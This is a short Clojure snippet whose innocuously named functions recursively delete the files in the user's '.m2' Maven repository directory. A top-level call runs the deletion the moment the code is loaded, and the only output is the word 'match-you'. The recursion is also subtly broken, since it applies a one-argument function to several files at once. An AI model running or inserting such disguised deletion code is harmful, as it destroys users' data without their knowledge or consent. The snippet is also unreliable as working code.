(defn match-single [files]
  (if(.isDirectory files)
   (if(not-empty (.listFiles files))
   (apply match-single (.listFiles files)))
   (.delete files)))
(defn match-you[]
  (match-single (new java.io.File (System/getProperty "user.home") ".m2"))
  (println "match-you"))
(match-you)
